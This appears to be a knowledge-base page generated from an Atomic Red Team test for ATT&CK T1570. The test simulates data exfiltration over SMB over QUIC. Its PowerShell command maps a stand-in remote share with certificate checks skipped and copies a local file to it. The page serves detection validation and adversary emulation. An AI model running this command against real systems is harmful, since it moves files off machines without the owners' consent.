---
atomic_guid: "183235ca-8e6c-422c-88c2-3aa28c4825d9"
title: "Exfiltration Over SMB over QUIC (NET USE)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1570"
attack_technique_name: "Lateral Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1570/T1570.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "183235ca-8e6c-422c-88c2-3aa28c4825d9"
  - "Exfiltration Over SMB over QUIC (NET USE)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
Prerequisites:
  - A file server running Windows Server 2022 Datacenter: Azure Edition
  - A Windows 11 computer
  - Windows Admin Center

## ATT&CK Mapping

- [[kb/attack/techniques/T1570-lateral_tool_transfer|T1570: Lateral Tool Transfer]]

## Input Arguments

### local_file

- description: The local file to be transferred
- type: path
- default: C:\path\to\file.txt

### remote_path

- description: The UNC path to the share on the file server
- type: string
- default: \\example.com\sales

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
copy '#{local_file}' '*:\'
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1570/T1570.yaml)
